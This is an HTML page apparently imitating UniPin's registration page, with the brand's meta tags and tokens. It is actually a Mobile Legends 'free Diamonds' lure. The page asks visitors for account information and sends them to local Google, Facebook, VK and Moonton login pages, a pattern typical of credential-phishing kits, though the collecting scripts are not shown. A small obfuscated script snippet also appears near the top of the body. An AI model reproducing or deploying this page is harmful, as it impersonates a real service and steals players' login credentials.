...
<head>
    ...
    <meta name='description' content="The fastest way to get game credits online!     Daftar akun UniPin. Top up voucher game online cepat dan murah, beli skin dan premium game tanpa kartu kredit.
">
    <meta name="csrf-token" content="P23liMM0EFvE9cY2luenV0UM8juyLBN9RhgTEOwX">
    ...
    <meta property="og:url" content="https://www.unipin.com/register"/>
    <meta property="og:type" content="website"/>
    <meta property="og:title" content="UniPin Daftar - UniPin"/>
    <meta property="og:description" content="The fastest way to get game credits online!     Daftar akun UniPin. Top up voucher game online cepat dan murah, beli skin dan premium game tanpa kartu kredit.
"/>
    ...
    <meta property="twitter:title" content="UniPin Daftar - UniPin"/>
    <meta property="twitter:description" content="The fastest way to get game credits online!     Daftar akun UniPin. Top up voucher game online cepat dan murah, beli skin dan premium game tanpa kartu kredit.
"/>
    <meta property="twitter:image" content="https://www.unipin.com/images/unipin-black-lg.png"/>
    <meta property="twitter:url" content="https://www.unipin.com/register"/>
...
<body class="drawer drawer--right">
        <div style='display:none' id='sbbhscc'></div>
          <script type="text/javascript">
            var sbbvscc='';
            var sbbgscc='';
            function genPid() {return String.fromCharCode(71)+String.fromCharCode(106) ; };
          </script>
...
<div class="majorWrap">
    <div id="ajaxArea">
        ...
        <main role="main">
                        <div class="template-splash"></div>
        <section>
            <div class="container">
                            <div class="row">
                    <div class="col-sm-offset-3 col-sm-6">
                                                <div class="signin-container">
                            <h2 align="center">Masuk ke akun Mobile Legends</h2>
                            <form method="POST" action="https://www.unipin.com/register" accept-charset="UTF-8" class="text-semibold row"><input name="_token" type="hidden" value="P23liMM0EFvE9cY2luenV0UM8juyLBN9RhgTEOwX">
                            

                            <div class="col-xs-12">
                                <br/>
                                <p style="font-weight: 300;text-align: justify">Untuk mendapatkan Diamond secara gratis, Kami membutuhkan informasi tentang akun Anda.</p>
                            </div>

                            <div class="col-xs-12">
                                <br/>
                                <div class="field-wrap text-center">
                                    <a href="google.php" class="btn btn-primary btn-radius-3 btn-md btn-block font-light mb-10">Login Google</a>
                                    <a href="facebook.php" class="btn btn-fb btn-radius-3 btn-md btn-block font-light mb-10">Login Facebook</a><br/>
                                    <a href="vk.php" class="btn btn-info btn-radius-3 btn-md btn-block font-light mb-10">Login VK</a><br/>
                                    <a href="moonton.php" class="btn btn-primary btn-radius-3 btn-md btn-block font-light mb-10">Login Moonton</a><br/>
                                </div>
                            </div>
                ...
                <div class="modal-dialog login-modal-dialog">
                    <div class="modal-content">
                        ...
                        <div class="modal-body">
                            <form method="POST" action="https://www.unipin.com/login" accept-charset="UTF-8" class="text-semibold row"><input name="_token" type="hidden" value="P23liMM0EFvE9cY2luenV0UM8juyLBN9RhgTEOwX">
                            ...
                            <div class="col-xs-12">
                                ...
                                <div class="field-wrap text-center">
                                    ...
                                    <a href="https://www.unipin.com/facebook/redirect" class="btn btn-fb btn-radius-3 btn-md btn-block font-light"><i class="fa fa-facebook-f"></i> &nbsp;Masuk Facebook</a><br/>
...
<script type="text/javascript">
    $(document).ready(function(){
        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': 'P23liMM0EFvE9cY2luenV0UM8juyLBN9RhgTEOwX'
            }
        });
